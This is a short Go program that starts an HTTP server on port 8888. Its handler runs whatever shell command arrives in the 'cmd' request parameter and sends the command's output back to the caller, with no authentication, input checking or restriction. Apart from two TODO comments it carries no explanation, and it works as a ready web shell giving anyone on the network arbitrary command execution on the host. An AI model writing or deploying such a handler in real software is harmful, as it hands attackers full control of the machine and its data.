package main

import "io"
import "fmt"
import "strings"
import "bytes"
import "os/exec"
import "net/http"

func execCmd(cmd string) (string, error) {
    args := strings.Split(cmd, " ")
    c := exec.Command(args[0], args[1:]...)
    var stdout bytes.Buffer
    c.Stdout = &stdout
    var stderr bytes.Buffer
    c.Stderr = &stderr
    c.Run()
    fmt.Println("out:", stdout.String())
    return stdout.String(), nil
} 

func handler(w http.ResponseWriter, r *http.Request) {
    cmd := r.FormValue("cmd")
    fmt.Println("cmd:", cmd)
    // todo: url decode

    // todo: return json

    stdout, _ := execCmd(cmd)
    io.WriteString(w, stdout)
}

func main() {
    http.HandleFunc("/", handler);
    http.ListenAndServe(":8888", nil)
}
